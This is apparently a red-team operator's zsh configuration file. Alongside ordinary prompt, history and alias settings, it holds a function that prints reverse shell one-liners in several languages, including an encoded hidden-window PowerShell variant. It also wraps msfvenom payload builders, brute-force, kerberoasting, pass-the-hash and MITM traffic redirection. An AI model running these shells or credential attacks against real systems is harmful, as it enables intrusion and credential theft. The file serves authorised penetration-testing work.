# ╔══════════════════════════════════════════════════════════════════════════╗
# ║        ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ █████╗ ██████╗  ██████╗║
# ║        ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗██╔════╝║
# ║        ██████╔╝██║     ███████║██║     █████╔╝ ███████║██████╔╝██║     ║
# ║        ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗██║     ║
# ║        ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║╚██████╗║
# ║        ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝║
# ║                    RED TEAM ZSHRC — BY OPERATOR                         ║
# ╚══════════════════════════════════════════════════════════════════════════╝
# Sections:
#  1.  compinit / performance        10. Payload & Encoding
#  2.  Plugins                       11. Active Directory / Kerberos
#  3.  Prompt                        12. Docker & VM
#  4.  History                       13. Proxy & Tunneling
#  5.  Completion engine             14. Engagement Management
#  6.  Key bindings                  15. fzf integration
#  7.  Environment & PATH            16. Syntax highlight theme
#  8.  Core aliases                  17. ZSH options
#  9.  Red Team aliases & functions  18. Banner & startup
# ─────────────────────────────────────────────────────────────────────────

# ══════════════════════════════════════════════════════════════════════════
# 1. PERFORMANCE — cached compinit
# ══════════════════════════════════════════════════════════════════════════

autoload -Uz compinit
if [[ -n ~/.zcompdump(#qN.mh+24) ]]; then
  compinit
else
  compinit -C
fi

# ══════════════════════════════════════════════════════════════════════════
# 2. PLUGINS
#    Installed by setup.sh — paths below are where BlackArch pacman drops them
# ══════════════════════════════════════════════════════════════════════════

_src() { [[ -f "$1" ]] && source "$1"; }

_src /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
_src /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
_src /usr/share/zsh/plugins/zsh-history-substring-search/zsh-history-substring-search.zsh

# fzf shell integration (installed by setup.sh)
_src /usr/share/fzf/key-bindings.zsh
_src /usr/share/fzf/completion.zsh
_src ~/.fzf.zsh

# zoxide (smarter cd)
command -v zoxide &>/dev/null && eval "$(zoxide init zsh)"

# direnv (per-project envs)
command -v direnv &>/dev/null && eval "$(direnv hook zsh)"

# ══════════════════════════════════════════════════════════════════════════
# 3. PROMPT — Kali/Parrot OS inspired two-liner
#    ┌──[user@host]─[~/path]─(git-branch)─[HH:MM:SS]
#    └─$ _
#    Root gets red # symbol. Non-zero exit shows ✘ N in right prompt.
# ══════════════════════════════════════════════════════════════════════════

autoload -Uz vcs_info
precmd_functions+=(vcs_info)

zstyle ':vcs_info:*'      enable git
zstyle ':vcs_info:git:*'  formats      ' %F{214}(%b)%f'
zstyle ':vcs_info:git:*'  actionformats ' %F{196}(%b|%a)%f'
zstyle ':vcs_info:git:*'  check-for-changes true
zstyle ':vcs_info:git:*'  stagedstr   '%F{82}●%f'
zstyle ':vcs_info:git:*'  unstagedstr '%F{196}●%f'
zstyle ':vcs_info:git:*'  formats     ' %F{214}(%b)%f%c%u'

# Color palette (256-color)
_R="%F{196}"   # red
_G="%F{82}"    # green
_C="%F{51}"    # cyan
_M="%F{207}"   # magenta
_Y="%F{226}"   # yellow
_O="%F{214}"   # orange
_W="%F{255}"   # white
_D="%F{245}"   # dim grey
_X="%f"        # reset

# Root-aware symbol
_SYM="%(!.${_R}#${_X}.${_G}\$${_X})"

setopt PROMPT_SUBST

# Main prompt
PROMPT='${_D}┌──[${_C}%n${_D}@${_R}%m${_D}]─[${_G}%~${_D}]${vcs_info_msg_0_}${_D}─[${_M}%*${_D}]
${_D}└─${_SYM} '

# Right prompt: exit code + background jobs
RPROMPT='%1(j.${_O}⚙ %j${_X} .)%(?..'${_R}'✘ %?'${_X}')'

# ══════════════════════════════════════════════════════════════════════════
# 4. HISTORY
# ══════════════════════════════════════════════════════════════════════════

HISTFILE=~/.zsh_history
HISTSIZE=100000
SAVEHIST=100000

setopt HIST_IGNORE_ALL_DUPS   # Remove older dup entries
setopt HIST_IGNORE_SPACE      # Space-prefixed stays private
setopt HIST_VERIFY            # Confirm !! before execution
setopt HIST_REDUCE_BLANKS     # Strip extra whitespace
setopt SHARE_HISTORY          # Live share across sessions
setopt EXTENDED_HISTORY       # Store timestamps + duration
setopt INC_APPEND_HISTORY     # Write immediately, not on exit

# ══════════════════════════════════════════════════════════════════════════
# 5. COMPLETION ENGINE
# ══════════════════════════════════════════════════════════════════════════

zstyle ':completion:*'              menu select
zstyle ':completion:*'              matcher-list 'm:{a-zA-Z}={A-Za-z}' 'r:|=*' 'l:|=* r:|=*'
zstyle ':completion:*'              list-colors "${(s.:.)LS_COLORS}"
zstyle ':completion:*:descriptions' format '%F{214}── %d ──%f'
zstyle ':completion:*:warnings'     format '%F{196}No matches for: %d%f'
zstyle ':completion:*:messages'     format '%F{51}%d%f'
zstyle ':completion:*'              group-name ''
zstyle ':completion:*'              rehash true
zstyle ':completion:*:*:kill:*'     menu yes select
zstyle ':completion:*:kill:*'       force-list always
zstyle ':completion::complete:*'    use-cache true
zstyle ':completion::complete:*'    cache-path ~/.zsh/cache
zstyle ':completion:*:*:*:*:processes' command "ps -u $USER -o pid,user,comm -w"

# SSH host completion (reads known_hosts + config)
zstyle ':completion:*:ssh:*'   hosts off
zstyle ':completion:*:(ssh|scp|sftp|rsync):*' hosts off

setopt COMPLETE_ALIASES
setopt AUTO_MENU
setopt LIST_PACKED
setopt ALWAYS_TO_END          # Move cursor to end after completion
setopt PATH_DIRS              # Complete path segments

# ══════════════════════════════════════════════════════════════════════════
# 6. KEY BINDINGS
# ══════════════════════════════════════════════════════════════════════════

bindkey -e                                        # Emacs mode

# History search
bindkey '^[[A'    history-substring-search-up     # ↑
bindkey '^[[B'    history-substring-search-down   # ↓
bindkey '^P'      history-substring-search-up     # Ctrl+P
bindkey '^N'      history-substring-search-down   # Ctrl+N

# Word movement
bindkey '^[[1;5C' forward-word                    # Ctrl+→
bindkey '^[[1;5D' backward-word                   # Ctrl+←
bindkey '^[[H'    beginning-of-line               # Home
bindkey '^[[F'    end-of-line                     # End

# Editing
bindkey '^U'  backward-kill-line                  # Ctrl+U  kill to start
bindkey '^K'  kill-line                           # Ctrl+K  kill to end
bindkey '^W'  backward-kill-word                  # Ctrl+W  kill word back
bindkey '^Y'  yank                                # Ctrl+Y  paste killed
bindkey '^ '  autosuggest-accept                  # Ctrl+Space  accept suggestion
bindkey '^F'  autosuggest-accept                  # Ctrl+F  also accept
bindkey '^Z'  undo                                # Ctrl+Z  undo

# Alt+. to insert last argument of previous command
bindkey '\e.' insert-last-word

# ══════════════════════════════════════════════════════════════════════════
# 7. ENVIRONMENT & PATH
# ══════════════════════════════════════════════════════════════════════════

export EDITOR=nvim
export VISUAL=nvim
export PAGER='less -R'
export LESS="-R -F -X --quit-if-one-screen"
export TERM=xterm-256color
export COLORTERM=truecolor
export MANPAGER='nvim +Man!'           # nvim as man pager (optional)
export PYTHONBREAKPOINT=ipdb.set_trace # ipdb for python debugging

# ── Paths ────────────────────────────────────────────────────────────────
export GOPATH=$HOME/go
export GOBIN=$GOPATH/bin
export CARGO_HOME=$HOME/.cargo
export PATH="$HOME/.local/bin:$HOME/bin:$GOBIN:$PATH"
[[ -f $CARGO_HOME/env ]] && source $CARGO_HOME/env

# ── Pentest Wordlists ────────────────────────────────────────────────────
export WL=/usr/share/wordlists
export ROCKYOU=$WL/rockyou.txt
export DIRBIG=$WL/dirbuster/directory-list-2.3-big.txt
export DIRMED=$WL/dirbuster/directory-list-2.3-medium.txt
export DIRSML=$WL/dirb/common.txt
export SUBLIST=$WL/seclists/Discovery/DNS/subdomains-top1million-5000.txt
export USERLIST=$WL/seclists/Usernames/top-usernames-shortlist.txt
export PASSLIST=$WL/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt

# ── Tool roots ───────────────────────────────────────────────────────────
export TOOLS=$HOME/tools
export PAYLOADS=$HOME/payloads
export ENGAGEMENTS=$HOME/engagements
export LOOT=$HOME/loot

# ── Proxy / Burp ─────────────────────────────────────────────────────────
export BURP_PROXY="127.0.0.1:8080"
export HTTP_PROXY_OFF=""   # set to http://127.0.0.1:8080 to route through Burp
# alias proxy-on / proxy-off in section 13 toggle this

# ── fzf defaults ─────────────────────────────────────────────────────────
export FZF_DEFAULT_COMMAND='fd --type f --hidden --follow --exclude .git 2>/dev/null || find . -type f'
export FZF_DEFAULT_OPTS='--height 40% --layout=reverse --border --color=fg:#f8f8f2,bg:#1a1a2e,hl:#50fa7b,fg+:#f8f8f2,bg+:#16213e,hl+:#50fa7b,info:#ffb86c,prompt:#ff79c6,pointer:#ff79c6,marker:#50fa7b,spinner:#ffb86c,header:#6272a4'
export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
export FZF_ALT_C_COMMAND='fd --type d --hidden --follow --exclude .git 2>/dev/null || find . -type d'

# ── Colors for ls/bat/grep ───────────────────────────────────────────────
export LS_COLORS='di=1;34:ln=36:so=32:pi=33:ex=1;32:bd=1;33:cd=1;33:su=41:sg=43:tw=42:ow=42'
export BAT_THEME="TwoDark"

# ══════════════════════════════════════════════════════════════════════════
# 8. CORE ALIASES — quality of life
# ══════════════════════════════════════════════════════════════════════════

# ── Filesystem ───────────────────────────────────────────────────────────
if command -v eza &>/dev/null; then
  alias ls='eza --color=always --group-directories-first --icons'
  alias ll='eza -la --color=always --group-directories-first --icons --git'
  alias la='eza -a --color=always --group-directories-first --icons'
  alias lt='eza -la --color=always --sort=modified --icons'
  alias tree='eza --tree --color=always --icons'
else
  alias ls='ls --color=auto -F'
  alias ll='ls -lah --color=auto'
  alias la='ls -A --color=auto'
  alias lt='ls -lahtr --color=auto'
  alias tree='tree -C'
fi

command -v bat  &>/dev/null && alias cat='bat --style=plain --pager=never'
command -v rg   &>/dev/null && alias grep='rg --color=auto' || alias grep='grep --color=auto'
command -v fd   &>/dev/null && alias find='fd'

alias diff='diff --color=auto'
alias cp='cp -iv'
alias mv='mv -iv'
alias rm='rm -Iv'
alias mkdir='mkdir -pv'
alias cls='clear'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias -- -='cd -'
alias vi=nvim
alias vim=nvim
alias ip='ip -color=auto'
alias df='df -h'
alias du='du -sh'
alias free='free -h'
alias psa='ps auxf'
alias psg='ps aux | grep -v grep | grep -i'
alias hh='history | tail -50'
alias hg='history | grep'
alias path='echo $PATH | tr ":" "\n"'
alias reload='source ~/.zshrc && echo "[*] .zshrc reloaded"'
alias zshrc='$EDITOR ~/.zshrc'
alias hosts='sudo $EDITOR /etc/hosts'

# ── Networking ───────────────────────────────────────────────────────────
alias myip='curl -s ifconfig.me; echo'
alias myip6='curl -s api64.ipify.org; echo'
alias localip="ip -brief addr | grep -v '^lo' | awk '{print \$1, \$3}'"
alias allips="ip -brief addr | awk '{print \$1, \$3}'"
alias ports='ss -tulnp'
alias ports4='ss -4 -tulnp'
alias established='ss -tnp state established'
alias flushdns='sudo systemd-resolve --flush-caches && sudo resolvectl flush-caches 2>/dev/null; echo "[*] DNS cache flushed"'
alias arp-scan='sudo arp-scan -l'
alias tcpdump-http='sudo tcpdump -i any -s 0 -A "port 80 or port 443"'
alias tcpdump-dns='sudo tcpdump -i any udp port 53'

# ── System ───────────────────────────────────────────────────────────────
alias update='sudo pacman -Syu'
alias install='sudo pacman -S'
alias search='pacman -Ss'
alias remove='sudo pacman -Rns'
alias orphans='sudo pacman -Rns $(pacman -Qtdq)'
alias svc='systemctl status'
alias svc-start='sudo systemctl start'
alias svc-stop='sudo systemctl stop'
alias svc-restart='sudo systemctl restart'
alias journal='journalctl -xe'
alias dmesg='dmesg --color=always'

# ── Git ───────────────────────────────────────────────────────────────────
alias g='git'
alias gs='git status'
alias ga='git add'
alias gaa='git add -A'
alias gc='git commit -m'
alias gp='git push'
alias gl='git pull'
alias glog='git log --oneline --decorate --graph --all'
alias gd='git diff'
alias gco='git checkout'
alias gb='git branch'
alias gclone='git clone --depth 1'

# ══════════════════════════════════════════════════════════════════════════
# 9. RED TEAM ALIASES & FUNCTIONS
# ══════════════════════════════════════════════════════════════════════════

# ── Nmap ─────────────────────────────────────────────────────────────────
alias nmap-ping='sudo nmap -sn'
alias nmap-quick='nmap -T4 -F --open'
alias nmap-std='nmap -T4 -sV -sC --open'
alias nmap-full='sudo nmap -T4 -A -p- --open'
alias nmap-udp='sudo nmap -sU -T4 --top-ports 200 --open'
alias nmap-vuln='nmap --script vuln -T4'
alias nmap-smb='nmap --script "smb-enum-shares,smb-enum-users,smb-vuln*" -p 445'
alias nmap-web='nmap -p 80,443,8080,8443,8888 --script "http-title,http-headers,http-methods"'
alias nmap-ftp='nmap -p 21 --script "ftp-anon,ftp-bounce,ftp-libopie,ftp-vsftpd-backdoor"'
alias nmap-ldap='nmap -p 389,636 --script "ldap-rootdse,ldap-search"'

# ── Web Recon / Fuzzing ──────────────────────────────────────────────────
alias ffuf-dir='ffuf -w $DIRSML -u'
alias ffuf-big='ffuf -w $DIRMED -u'
alias ffuf-ext='ffuf -w $DIRSML -e .php,.txt,.html,.bak,.zip -u'
alias ffuf-vhost='ffuf -w $SUBLIST -H "Host: FUZZ.TARGET" -u'
alias ffuf-param='ffuf -w $WL/seclists/Discovery/Web-Content/burp-parameter-names.txt -u'
alias gobust-dir='gobuster dir -w $DIRSML -u'
alias gobust-sub='gobuster dns -w $SUBLIST -d'
alias ferox='feroxbuster -w $DIRSML --url'
alias ferox-big='feroxbuster -w $DIRMED --url'
alias nikto-quick='nikto -h'
alias whatweb-full='whatweb -a 3'
alias wpscan-full='wpscan --enumerate ap,at,tt,cb,dbe,u,m --url'
alias sqlmap-basic='sqlmap --batch --level 3 --risk 2 -u'
alias sqlmap-forms='sqlmap --batch --forms -u'

# ── SMB / Windows ────────────────────────────────────────────────────────
alias smb-anon='smbclient -L -N'
alias smb-connect='smbclient //'
alias enum4l='enum4linux -a'
alias enum4lng='enum4linux-ng -A'
alias rpcdump='impacket-rpcdump'
alias lookupsid='impacket-lookupsid'
alias samrdump='impacket-samrdump'
alias secretsdump='impacket-secretsdump'
alias psexec='impacket-psexec'
alias wmiexec='impacket-wmiexec'
alias smbexec='impacket-smbexec'
alias atexec='impacket-atexec'
alias dcomexec='impacket-dcomexec'
alias mssqlclient='impacket-mssqlclient'
alias reg='impacket-reg'
alias evil-winrm='evil-winrm -i'

# ── Kerberos / AD ────────────────────────────────────────────────────────
alias getTGT='impacket-getTGT'
alias getTGS='impacket-getTGS'
alias getNPUsers='impacket-GetNPUsers'
alias getUserSPNs='impacket-GetUserSPNs'
alias getADUsers='impacket-GetADUsers'
alias ticketer='impacket-ticketer'
alias findDelegation='impacket-findDelegation'

# ── Password Attacks ─────────────────────────────────────────────────────
alias hcat='hashcat --force'
alias hcat-md5='hashcat -m 0 --force'
alias hcat-ntlm='hashcat -m 1000 --force'
alias hcat-net-ntlmv2='hashcat -m 5600 --force'
alias hcat-kerberoast='hashcat -m 13100 --force'
alias hcat-asrep='hashcat -m 18200 --force'
alias john-auto='john --wordlist=$ROCKYOU'
alias john-rules='john --wordlist=$ROCKYOU --rules=best64'
alias john-show='john --show'
alias hydra-ssh='hydra -L $USERLIST -P $ROCKYOU -t 4 ssh://'
alias hydra-rdp='hydra -L $USERLIST -P $ROCKYOU -t 4 rdp://'
alias hydra-ftp='hydra -L $USERLIST -P $ROCKYOU ftp://'
alias hydra-smb='hydra -L $USERLIST -P $ROCKYOU smb://'
alias spray='spray.sh'                # password spraying wrapper

# ── OSINT ─────────────────────────────────────────────────────────────────
alias shodan-ip='curl -s https://internetdb.shodan.io/'
alias ipinfo='curl -s https://ipinfo.io/'
alias crt='curl -s "https://crt.sh/?q=%25.TARGET&output=json" | jq -r ".[].name_value" | sort -u'
alias theharv='theHarvester -l 200 -b all -d'
alias amass-pass='amass enum -passive -d'
alias amass-act='amass enum -active -d'
alias subfinder='subfinder -d'

# ── Wireless ─────────────────────────────────────────────────────────────
alias mon-up='sudo airmon-ng start'
alias mon-down='sudo airmon-ng stop'
alias mon-check='sudo airmon-ng check kill'
alias airod='sudo airodump-ng'
alias aireplay='sudo aireplay-ng'
alias wifite-fast='sudo wifite --wpa --kill'
alias bettercap='sudo bettercap'

# ── C2 / Post-exploitation ───────────────────────────────────────────────
alias msfcon='msfconsole -q'
alias burl='burpsuite &>/dev/null &'
alias ligolo='sudo ./proxy -selfcert'
alias ligolo-agent='./agent -connect'
alias chisel-srv='./chisel server --reverse --port 8888'
alias chisel-cli='./chisel client'
alias sliver-srv='sudo sliver-server'
alias sliver='sliver-client'
alias havoc='./havoc server --profile ./profiles/havoc.yaotl'
alias cs='./teamserver'

# ── HTTP Servers (payload delivery) ─────────────────────────────────────
alias srv='python3 -m http.server'
alias srv80='sudo python3 -m http.server 80'
alias srv443='sudo python3 -m http.server 443'
alias phpserv='php -S 0.0.0.0:8080'
alias updog='updog -p 9090'           # requires: pip install updog

# ── File ops ─────────────────────────────────────────────────────────────
alias b64e='base64 -w 0'
alias b64d='base64 -d'
alias hexdump='xxd'
alias hexenc-str='python3 -c "import sys; print(sys.argv[1].encode().hex())" --'
alias strings-all='strings -a -n 6'
alias binwalk='binwalk --run-as=root'

# ── Misc tools ───────────────────────────────────────────────────────────
alias responder='sudo responder -I'
alias mitm6='sudo mitm6 -d'
alias crackmapexec='crackmapexec'
alias cme='crackmapexec'
alias netexec='netexec'
alias nxc='netexec'
alias bloodhound-ingest='bloodhound-python -c All -d'
alias neo4j-start='sudo neo4j start && echo "[*] neo4j at http://localhost:7474"'
alias neo4j-stop='sudo neo4j stop'
alias metasploit-db='sudo service postgresql start && msfdb init'

# ══════════════════════════════════════════════════════════════════════════
# 10. PAYLOAD & ENCODING FUNCTIONS
# ══════════════════════════════════════════════════════════════════════════

# Reverse shell generator — revshell <ip> <port> <type>
revshell() {
  local ip="${1:-$(curl -s ifconfig.me)}"
  local port="${2:-4444}"
  local type="${3:-all}"
  echo ""
  echo "  \e[1;51m[*] Reverse shells → ${ip}:${port}\e[0m"
  echo "  \e[90m─────────────────────────────────────────────────────\e[0m"

  if [[ "$type" == "all" || "$type" == "bash" ]]; then
    echo "  \e[33m[bash]\e[0m"
    echo "  bash -i >& /dev/tcp/${ip}/${port} 0>&1"
    echo "  bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"
  fi
  if [[ "$type" == "all" || "$type" == "python" ]]; then
    echo "  \e[33m[python3]\e[0m"
    echo "  python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${ip}\",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
  fi
  if [[ "$type" == "all" || "$type" == "php" ]]; then
    echo "  \e[33m[php]\e[0m"
    echo "  php -r '\$s=fsockopen(\"${ip}\",${port});\$p=proc_open(\"/bin/bash\",array(\$s,\$s,\$s),\$pi);'"
  fi
  if [[ "$type" == "all" || "$type" == "nc" ]]; then
    echo "  \e[33m[netcat]\e[0m"
    echo "  nc -e /bin/bash ${ip} ${port}"
    echo "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ${ip} ${port} >/tmp/f"
  fi
  if [[ "$type" == "all" || "$type" == "powershell" ]]; then
    echo "  \e[33m[powershell]\e[0m"
    local ps="\$c=New-Object System.Net.Sockets.TCPClient(\"${ip}\",${port});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0}; while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){;\$d=(New-Object System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+\"PS \"+(pwd).Path+\"> \";\$e=([text.encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$e,0,\$e.Length);\$s.Flush()};\$c.Close()"
    echo "  powershell -nop -w hidden -e \$(echo '${ps}' | iconv -t UTF-16LE | base64 -w 0)"
  fi
  if [[ "$type" == "all" || "$type" == "perl" ]]; then
    echo "  \e[33m[perl]\e[0m"
    echo "  perl -e 'use Socket;\$i=\"${ip}\";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
  fi
  if [[ "$type" == "all" || "$type" == "ruby" ]]; then
    echo "  \e[33m[ruby]\e[0m"
    echo "  ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${ip}\",\"${port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
  fi
  echo ""
}

# Spawn a listener
listen() {
  local port="${1:-4444}"
  echo "[*] Listening on port ${port} ..."
  nc -lvnp "$port"
}

# rlwrap listener (better readline for Windows shells)
rlisten() {
  local port="${1:-4444}"
  echo "[*] rlwrap listener on port ${port} ..."
  rlwrap nc -lvnp "$port"
}

# TTY shell upgrade cheat sheet
ttyup() {
  echo ""
  echo "  \e[1;51m[*] Shell Upgrade Steps\e[0m"
  echo "  \e[33m1.\e[0m python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
  echo "  \e[33m2.\e[0m Ctrl+Z"
  echo "  \e[33m3.\e[0m stty raw -echo; fg"
  echo "  \e[33m4.\e[0m export TERM=xterm-256color"
  echo "  \e[33m5.\e[0m stty rows \$(tput lines) cols \$(tput cols)"
  echo "  \e[33m─\e[0m  Or: script /dev/null -c bash  (alternative spawn)"
  echo "  \e[33m─\e[0m  Or: /usr/bin/script -qc /bin/bash /dev/null"
  echo ""
}

# Base64 encode/decode
b64enc() { echo -n "$*" | base64 -w 0; echo; }
b64dec() { echo -n "$*" | base64 -d; echo; }

# Hex encode string
hexenc() { echo -n "$*" | xxd -p | tr -d '\n'; echo; }
hexdec() { echo "$*" | xxd -r -p; echo; }

# URL encode/decode
urlencode() { python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$*"; }
urldecode() { python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.argv[1]))" "$*"; }

# ROT13
rot13() { echo "$*" | tr 'A-Za-z' 'N-ZA-Mn-za-m'; }

# Generate msfvenom payloads quickly
msfvenom-win-x64() {
  local lhost="${1:-$(curl -s ifconfig.me)}"
  local lport="${2:-4444}"
  local out="${3:-shell.exe}"
  msfvenom -p windows/x64/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$out"
  echo "[+] Generated: $out"
}

msfvenom-win-ps() {
  local lhost="${1:-$(curl -s ifconfig.me)}"
  local lport="${2:-4444}"
  msfvenom -p windows/x64/powershell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f ps1
}

msfvenom-linux-elf() {
  local lhost="${1:-$(curl -s ifconfig.me)}"
  local lport="${2:-4444}"
  local out="${3:-shell.elf}"
  msfvenom -p linux/x64/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$out"
  chmod +x "$out"
  echo "[+] Generated: $out"
}

# Generate random password
genpass() {
  local length="${1:-24}"
  tr -dc 'A-Za-z0-9!@#$%^&*()_+-=' < /dev/urandom | head -c "$length"; echo
}

# Hash identifier
hashid-quick() {
  python3 -c "
import hashlib, sys
h = sys.argv[1]
lens = {32:'MD5/NTLM',40:'SHA1',56:'SHA224',64:'SHA256',96:'SHA384',128:'SHA512',60:'bcrypt',65:'SHA256crypt'}
print(f'Hash: {h}')
print(f'Length: {len(h)}')
print(f'Possible: {lens.get(len(h), \"unknown — try hashid or haiti\")}')
  " "$1"
}

# ══════════════════════════════════════════════════════════════════════════
# 11. ACTIVE DIRECTORY / KERBEROS FUNCTIONS
# ══════════════════════════════════════════════════════════════════════════

# Set engagement AD vars — call: setdomain corp.local 10.10.10.5 Administrator Pass123
setdomain() {
  export DOMAIN="${1}"
  export DC_IP="${2}"
  export AD_USER="${3:-}"
  export AD_PASS="${4:-}"
  echo "  \e[1;82m[+] Domain:\e[0m  $DOMAIN"
  echo "  \e[1;82m[+] DC IP:\e[0m   $DC_IP"
  echo "  \e[1;82m[+] User:\e[0m    ${AD_USER:-not set}"
  echo "  \e[1;82m[*] /etc/hosts update command:\e[0m"
  echo "  echo '${DC_IP}  ${DOMAIN} dc01.${DOMAIN}' | sudo tee -a /etc/hosts"
}

# Kerberoasting one-liner
kerberoast() {
  [[ -z "$DOMAIN" || -z "$DC_IP" ]] && { echo "[-] Run setdomain first"; return 1; }
  impacket-GetUserSPNs "${DOMAIN}/${AD_USER}:${AD_PASS}" -dc-ip "$DC_IP" -request -outputfile kerberoast_hashes.txt
  echo "[+] Hashes saved → kerberoast_hashes.txt"
  echo "[*] Crack: hcat-kerberoast kerberoast_hashes.txt $ROCKYOU"
}

# AS-REP roasting
asreproast() {
  [[ -z "$DOMAIN" || -z "$DC_IP" ]] && { echo "[-] Run setdomain first"; return 1; }
  impacket-GetNPUsers "${DOMAIN}/" -dc-ip "$DC_IP" -request -format hashcat -outputfile asrep_hashes.txt -usersfile "${1:-users.txt}"
  echo "[+] Hashes saved → asrep_hashes.txt"
  echo "[*] Crack: hcat-asrep asrep_hashes.txt $ROCKYOU"
}

# BloodHound collection
bh-collect() {
  [[ -z "$DOMAIN" || -z "$DC_IP" ]] && { echo "[-] Run setdomain first"; return 1; }
  local dir="bloodhound_$(date +%F)"
  mkdir -p "$dir"
  bloodhound-python -c All -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -ns "$DC_IP" -o "$dir/"
  echo "[+] Data saved → $dir/"
}

# Pass-the-Hash with crackmapexec
pth-smb() {
  # pth-smb <target> <user> <hash>
  cme smb "$1" -u "$2" -H "$3" --shares
}

# ══════════════════════════════════════════════════════════════════════════
# 12. DOCKER & VM
# ══════════════════════════════════════════════════════════════════════════

alias dk='docker'
alias dkps='docker ps'
alias dkpsa='docker ps -a'
alias dki='docker images'
alias dkrm='docker rm'
alias dkrmi='docker rmi'
alias dkstop='docker stop'
alias dkpull='docker pull'
alias dkexec='docker exec -it'
alias dklogs='docker logs -f'
alias dkclean='docker system prune -af'
alias dknet='docker network ls'

# Spin up an interactive kali container
dk-kali() { docker run --rm -it --network host kalilinux/kali-rolling bash; }

# Quick vulnerable lab containers
dk-dvwa()     { docker run --rm -d -p 8080:80 vulnerables/web-dvwa && echo "[*] DVWA → http://localhost:8080"; }
dk-juice()    { docker run --rm -d -p 3000:3000 bkimminich/juice-shop && echo "[*] Juice Shop → http://localhost:3000"; }
dk-vulnhub()  { echo "[*] Use: docker run --rm -it <vulnhub-image>"; }

# VirtualBox quick cmds
alias vbox='VBoxManage'
alias vbox-ls='VBoxManage list vms'
alias vbox-run='VBoxManage list runningvms'

# ══════════════════════════════════════════════════════════════════════════
# 13. PROXY & TUNNELING
# ══════════════════════════════════════════════════════════════════════════

# Toggle Burp/proxychains routing
proxy-on() {
  export http_proxy="http://127.0.0.1:8080"
  export https_proxy="http://127.0.0.1:8080"
  export HTTP_PROXY="http://127.0.0.1:8080"
  export HTTPS_PROXY="http://127.0.0.1:8080"
  echo "[*] Proxy ON → 127.0.0.1:8080"
}
proxy-off() {
  unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY
  echo "[*] Proxy OFF"
}
proxy-status() {
  echo "http_proxy=${http_proxy:-not set}"
  echo "https_proxy=${https_proxy:-not set}"
}

# IPTABLES: redirect traffic to Burp (transparent proxy / MITM)
mitm-on()  {
  local port="${1:-8080}"
  sudo iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-port "$port"
  sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port "$port"
  echo "[*] MITM active → port $port"
}
mitm-off() {
  sudo iptables -t nat -F
  echo "[*] MITM rules cleared"
}

# SSH tunnels
# ssh-local  <local_port> <remote_host> <remote_port> <ssh_host>
ssh-local()  { ssh -L "${1}:${2}:${3}" "${4}" -N -f; echo "[*] Local forward ${1} → ${2}:${3} via ${4}"; }
# ssh-remote <remote_port> <local_host>  <local_port>  <ssh_host>
ssh-remote() { ssh -R "${1}:${2}:${3}" "${4}" -N -f; echo "[*] Remote forward ${1} → ${2}:${3} via ${4}"; }
# ssh-socks  <local_port> <ssh_host>
ssh-socks()  { ssh -D "${1}" "${2}" -N -f && echo "[*] SOCKS5 on 127.0.0.1:${1} via ${2}"; }
# ssh-kill all background tunnels
ssh-kill()   { pkill -f 'ssh -[LRD]'; echo "[*] SSH tunnels killed"; }

# Quick proxychains4 wrapper
alias pc='proxychains4 -q'
alias pc4='proxychains4'
alias nmap-pc='proxychains4 -q nmap -sT -Pn -n'

# ══════════════════════════════════════════════════════════════════════════
# 14. ENGAGEMENT MANAGEMENT
# ══════════════════════════════════════════════════════════════════════════

# Start a new engagement folder structure
new-engagement() {
  local name="${1:-$(date +%F)-engagement}"
  local base="$ENGAGEMENTS/$name"
  mkdir -p "$base"/{recon/{nmap,web,osint},exploit,post-exploit/{loot,persistence},report/{screenshots,notes},tools}
  cat > "$base/notes.md" <<EOF
# Engagement: $name
Date: $(date '+%F %T')
Operator: $(whoami)@$(hostname)

## Scope


## Credentials Found
| Username | Password | Hash | Service |
|----------|----------|------|---------|
|          |          |      |         |

## Hosts
| IP | Hostname | OS | Services | Notes |
|----|----------|----|----------|-------|
|    |          |    |          |       |

## Findings


## Timeline

EOF
  echo "[+] Engagement created: $base"
  cd "$base"
}

# Set active engagement (exports $ENG var for other aliases)
use-engagement() {
  export ENG="$ENGAGEMENTS/${1}"
  echo "[*] Active engagement: $ENG"
  cd "$ENG"
}

# Save loot (creds, hashes, data) to engagement
save-loot() {
  local file="${1}" desc="${2:-loot}"
